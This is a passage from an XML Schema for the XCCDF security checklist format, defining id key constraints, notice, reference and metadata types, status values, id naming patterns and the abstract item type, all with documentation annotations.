                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group | .//cdf:Rule"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="plainTextValueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:plain-text&gt; objects and
                    &lt;xccdf:Value&gt; objects each have an id, and they must be unique and not
                    overlap. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:plain-text | .//cdf:Value"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="profileIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Profile&gt; objects have a unique id, it
                    is used for extension, too. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:Profile"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:keyref name="valueExtIdKeyRef" refer="cdf:valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Value&gt;
                    object must reference an existing &lt;xccdf:Value&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="groupExtIdKeyRef" refer="cdf:groupIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Group&gt;
                    objects must reference an existing &lt;xccdf:Group&gt;. NOTE:
                    &lt;xccdf:Group&gt; extension is now deprecated and should be avoided.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="ruleExtIdKeyRef" refer="cdf:ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on an &lt;xccdf:Rule&gt;
                    object must reference an existing &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Rule"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="profileExtIdKeyRef" refer="cdf:profileIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> An @extends attribute on &lt;xccdf:Profile&gt;
                    object must reference an existing &lt;xccdf:Profile&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:Profile"/>
            <xsd:field xpath="@extends"/>
        </xsd:keyref>

        <xsd:keyref name="valueIdKeyRef" refer="cdf:valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:check-export&gt; elements must reference
                    existing &lt;xccdf:Value&gt; elements. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:check/cdf:check-export"/>
            <xsd:field xpath="@value-id"/>
        </xsd:keyref>

        <xsd:keyref name="subValueKeyRef" refer="cdf:plainTextValueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:sub&gt; elements must reference existing
                    &lt;xccdf:Value&gt; or &lt;xccdf:plain-text&gt; ids. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:sub"/>
            <xsd:field xpath="@idref"/>
        </xsd:keyref>

        <xsd:keyref name="ruleIdKeyRef" refer="cdf:ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> The &lt;xccdf:rule-result&gt; element @idref must
                    refer to an existing &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:TestResult/cdf:rule-result"/>
            <xsd:field xpath="@idref"/>
        </xsd:keyref>

    </xsd:element>

    <xsd:complexType name="noticeType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for an &lt;xccdf:notice&gt; element.
                &lt;xccdf:notice&gt; elements are used to include legal notices (licensing
                information, terms of use, etc.), copyright statements, warnings, and other advisory
                notices about this &lt;xccdf:Benchmark&gt; and its use. This information may be
                expressed using XHTML or may be a simply text expression. Each &lt;xccdf:notice&gt;
                element must have a unique identifier. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded"
                processContents="skip"/>
        </xsd:sequence>
        <xsd:attribute name="id" type="xsd:NCName">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The unique identifier for this
                    &lt;xccdf:notice&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute ref="xml:lang"/>
    </xsd:complexType>

    <xsd:complexType name="dc-statusType">
        <xsd:annotation>
            <xsd:documentation>Data type element for the &lt;xccdf:dc-status&gt; element, which
                holds status information about its parent element using the Dublin Core format,
                expressed as elements of the DCMI Simple DC Element specification.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://purl.org/dc/elements/1.1/" minOccurs="1"
                maxOccurs="unbounded"/>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="plainTextType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The data type for an &lt;xccdf:plain-text&gt; element,
                which is a reusable text block for reference by the &lt;xccdf:sub&gt; element. This
                allows text to be defined once and then reused multiple times. Each
                &lt;xccdf:plain-text&gt; element mush have a unique id.</xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="id" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The unique identifier for this
                            &lt;xccdf:plain-text&gt; element.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="referenceType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This element provides supplementary descriptive text
                for a XCCDF elements. When used, it has either a simple string value or a value
                consisting of simple Dublin Core elements. If a bare string appears, then it is
                taken to be the string content for a Dublin Core title element. Multiple
                &lt;xccdf:reference&gt; elements may appear; a document generation processing tool
                may concatenate them, or put them into a reference list, and may choose to number
                them. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://purl.org/dc/elements/1.1/" processContents="lax"
                minOccurs="0" maxOccurs="unbounded"/>
        </xsd:sequence>
        <xsd:attribute name="href" type="xsd:anyURI">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URL pointing to the referenced
                    resource.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="override" type="xsd:boolean">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance
                    processing.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="signatureType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type of an &lt;XMLDSig:signature&gt; element,
                which holds an enveloped digital signature asserting authorship and allowing
                verification of the integrity of associated data (e.g., its parent element, other
                documents, portions of other documents). </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/2000/09/xmldsig#" processContents="skip"
                minOccurs="1" maxOccurs="1"/>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="metadataType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type that supports inclusion of metadata about a
                document or element. This is particularly useful for facilitating the discovery and
                retrieval of XCCDF checklists from public repositories. When used, the contents of
                the &lt;xccdf:metadata&gt; element are expressed in XML. The &lt;xccdf:Benchmark&gt;
                element's metadata should contain information formatted using the Dublin Core
                Metadata Initiative (DCMI) Simple DC Element specification, as described in [DCES]
                and [DCXML]. Benchmark consumers should be prepared to process Dublin Core metadata
                in the &lt;xccdf:metadata&gt; element. Other metadata schemes, including ad-hoc
                elements, are also allowed, both in the &lt;xccdf:Benchmark&gt; and in other
                elements.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any minOccurs="1" maxOccurs="unbounded" processContents="lax" namespace="##other"/>
        </xsd:sequence>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- *************  Global elements and types  ******************** -->
    <!-- ************************************************************** -->
    <xsd:element name="status">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The acceptance status of an element with an optional
                date attribute, which signifies the date of the status change. If an element does
                not have its own &lt;xccdf:status&gt; element, its status is that of its parent
                element. If there is more than one &lt;xccdf:status&gt; for a single element, then
                every instance of the &lt;xccdf:status&gt; element must have a @date attribute, and
                the &lt;xccdf:status&gt; element with the latest date is considered the current
                status. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:simpleContent>
                <xsd:extension base="cdf:statusType">
                    <xsd:attribute name="date" type="xsd:date" use="optional">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The date the parent element achieved
                                the indicated status.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:attribute>
                </xsd:extension>
            </xsd:simpleContent>
        </xsd:complexType>
    </xsd:element>

    <xsd:element name="model">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> A suggested scoring model for an
                &lt;xccdf:Benchmark&gt;, also encapsulating any parameters needed by the model.
                Every model is designated with a URI, which appears here as the system attribute.
                See the XCCDF specification for a list of standard scoring models and their
                associated URIs. Vendors may define their own scoring models and provide additional
                URIs to designate them. Some models may need additional parameters; to support such
                a model, zero or more &lt;xccdf:param&gt; elements may appear as children of the
                &lt;xccdf:model&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:sequence>
                <xsd:element name="param" type="cdf:paramType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Parameters provided as input to the
                            designated scoring model.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:sequence>
            <xsd:attribute name="system" type="xsd:anyURI" use="required">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A URI designating a scoring
                        model.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
        </xsd:complexType>

        <xsd:key name="paramNameKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Parameter names must be unique.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:param"/>
            <xsd:field xpath="@name"/>
        </xsd:key>
    </xsd:element>

    <xsd:complexType name="paramType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a parameter used in the &lt;xccdf:model&gt;
                element, which records scoring model information. The contents of this type
                represent a name-value pair, where the name is recorded in the @name attribute and
                the value appears in the element body. &lt;xccdf:param&gt; elements with equal
                values for the @name attribute may not appear as children of the same
                &lt;xccdf:model&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="name" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The name associated with the contained
                            value.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>


    <xsd:simpleType name="statusType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The statusType represents the possible levels of
                maturity or consensus level for its parent element as recorded by an
                &lt;xccdf:status&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="accepted">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Released as final</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="deprecated">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">No longer needed</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="draft">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Released in draft state</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="incomplete">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Under initial development</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="interim">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Revised and in the process of being
                        finalized</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="versionType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for most &lt;xccdf:version&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="time" type="xsd:dateTime" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The time that this version of the
                            associated element was completed. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="update" type="xsd:anyURI" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI indicating a location where updates
                            to the associated element may be obtained. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- ********************  Text Types  **************************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="textType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a simple text string with an @override
                attribute for controlling inheritance. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute ref="xml:lang"/>
                <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to manage inheritance.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="htmlTextType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for a string with optional XHTML elements and
                an @xml:lang attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded"
                processContents="skip"/>
        </xsd:sequence>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="htmlTextWithSubType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for a string with optional XHTML elements,
                and an @xml:lang attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text
                        substitution</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" processContents="skip"/>
        </xsd:choice>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileNoteType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:profile-note&gt; within an
                &lt;xccdf:Rule&gt;. This element contains text that describes special aspects of an
                &lt;xccdf:Rule&gt; relative to one or more &lt;xccdf:Profile&gt; elements. This
                allows an author to document things within &lt;xccdf:Rule&gt; elements that are
                specific to a given &lt;xccdf:Profile&gt;. This information might then be displayed
                to a reader based on the selection of a particular &lt;xccdf:Profile&gt;. The body
                text may include XHTML mark-up as well as &lt;xccdf:sub&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text
                        substitution</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" processContents="skip"/>
        </xsd:choice>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="tag" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The identifier of this note. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="textWithSubType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a string with embedded &lt;xccdf:Value&gt;
                substitutions and an @override attribute to help manage inheritance.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="sub" type="cdf:subType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text substitution.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="subType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The type used for &lt;xccdf:sub&gt; elements. The
                &lt;xccdf:sub&gt; element identifies replacement content that should appear in place
                of the &lt;xccdf:sub&gt; element during text substitution. The subType consists of a
                regular idrefType with an additional @use attribute to dictate the behavior of the
                &lt;xccdf:sub&gt; element under substitution. When the @idref is to an
                &lt;xccdf:Value&gt;, the @use attribute indicates whether the &lt;xccdf:Value&gt;
                element's title or value should replace the &lt;xccdf:sub&gt; element. The @use
                attribute is ignored when the @idref is to an &lt;xccdf:plain-text&gt; element; the
                body of the &lt;xccdf:plain-text&gt; element is always used to replace the
                &lt;xccdf:sub&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:idrefType">
                <xsd:attribute name="use" use="optional" default="value" type="cdf:subUseEnumType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Dictates the nature of the content inserted
                            under text substitution processing. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:simpleType name="benchmarkIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Benchmark&gt; elements. xccdf_N_benchmark_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_benchmark_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="ruleIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Rule&gt; elements. xccdf_N_rule_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_rule_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="groupIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Group&gt; elements. xccdf_N_group_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_group_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="valueIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Value&gt; elements. xccdf_N_value_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_value_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="profileIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Profile&gt; elements. xccdf_N_profile_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_profile_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="testresultIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:TestResult&gt; elements. xccdf_N_testresult_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_testresult_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="tailoringIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Tailoring&gt; elements. xccdf_N_tailoring_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_tailoring_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements that contain a reference to
                another XCCDF element </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id value of another XCCDF
                    element</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="idrefListType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements contain list of references to
                other XCCDF elements </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:NMTOKENS" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A space-separated list of id values from other
                    XCCDF elements</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="CPE2idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for &lt;xccdf:platform&gt; elements that do
                not need @override attributes. (I.e., &lt;xccdf:platform&gt; elements that are in
                structures that cannot be extended, such as &lt;xccdf:TestResult&gt; and
                &lt;xccdf:Benchmark&gt; elements.) This is used to identify the applicable target
                platform for its respective parent elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Should be a CPE 2.3 Applicability Language
                    identifier using the Formatted String binding or the value of a
                    &lt;cpe:platform-specification&gt; element's @id attribute, the latter acting as
                    a reference to some expression defined using the CPE schema in the
                    &lt;xccdf:Benchmark&gt; element's &lt;cpe:platform-specification&gt; element.
                    The @idref may be a CPE Applicability Language identifier using the URI binding,
                    although this is less preferred.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="overrideableCPE2idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for &lt;xccdf:platform&gt; elements that need
                @override attributes. (I.e., &lt;xccdf:platform&gt; elements that are in structures
                that can be extended, such as Items and &lt;xccdf:Profile&gt; elements.) This is
                used to identify the applicable target platform for its respective parent elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:CPE2idrefType">
                <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to manage inheritance.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- **************** Item Element (Base Class)  ****************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Item" type="cdf:itemType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> An item is a named constituent of an
                &lt;xccdf:Benchmark&gt;. There are three types of items: &lt;xccdf:Group&gt;,
                &lt;xccdf:Rule&gt; and &lt;xccdf:Value&gt;. The &lt;xccdf:Item&gt; element type
                imposes constraints shared by all &lt;xccdf:Group&gt;, &lt;xccdf:Rule&gt; and
                &lt;xccdf:Value&gt; elements. The itemType is abstract, so the element
                &lt;xccdf:Item&gt; can never appear in a valid XCCDF document.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="itemType" abstract="1">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This abstract itemType represents the basic data
                shared by all &lt;xccdf:Group&gt;, &lt;xccdf:Rule&gt; and &lt;xccdf:Value&gt;
                elements. All elements in an itemType are optional, although each element that
                builds on the itemType may add its own elements, some of which will be required for
                that element. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the item and date at which it
                        attained that status. &lt;xccdf:Benchmark&gt; authors may use this element
                        to record the maturity or consensus level for elements in the
                        &lt;xccdf:Benchmark&gt;. If an item does not have an explicit
                        &lt;xccdf:status&gt; given, then its status is that of its
                        parent.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" type="cdf:versionType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Version information about this item.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textWithSubType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the item. Every item should have an
                        &lt;xccdf:title&gt;, because this helps people understand the purpose of the
                        item. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Text that describes the item.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="warning" type="cdf:warningType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A note or caveat about the item intended to
                        convey important cautionary information for the &lt;xccdf:Benchmark&gt; user
                        (e.g., “Complying with this rule will cause the system to reject all IP
                        packets”). If multiple &lt;xccdf:warning&gt; elements appear, benchmark
                        consumers should concatenate them for generating reports or documents.
                        Benchmark consumers may present this information in a special manner in
                        generated documents.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="question" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Interrogative text to present to the user
                        during tailoring. It may also be included into a generated document. For
                        &lt;xccdf:Rule&gt; and &lt;xccdf:Group&gt; elements, the
                        &lt;xccdf:question&gt; text should be a simple binary (yes/no) question
                        because it is supporting the selection aspect of tailoring. For
                        &lt;xccdf:Value&gt; elements, the &lt;xccdf:question&gt; should solicit the
                        user to provide a specific value. Tools may also display constraints on
                        values and any defaults as specified by the other &lt;xccdf:Value&gt;
                        properties.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">References where the user can learn more about
                        the subject of this item. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this item, such as
                        sources, special information, or other details. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="abstract" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, then this item is abstract and exists only
                    to be extended. The use of this attribute for &lt;xccdf:Group&gt; elements is
                    deprecated and should be avoided. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="cluster-id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier to be used as a means to identify
                    (refer to) related items. It designates membership in a cluster of items, which
                    are used for controlling items via &lt;xccdf:Profile&gt; elements. All the items
                    with the same cluster identifier belong to the same cluster. A selector in an
                    &lt;xccdf:Profile&gt; may refer to a cluster, thus making it easier for authors
                    to create and maintain &lt;xccdf:Profile&gt; elements in a complex
                    &lt;xccdf:Benchmark&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="extends" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The identifier of an item on which to base this
                    item. If present, it must have a value equal to the @id attribute of another
                    item. The use of this attribute for &lt;xccdf:Group&gt; elements is deprecated
                    and should be avoided. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="hidden" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If this item should be excluded from any generated
                    documents although it may still be used during assessments. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="prohibitChanges" type="xsd:boolean" default="false" use="optional">
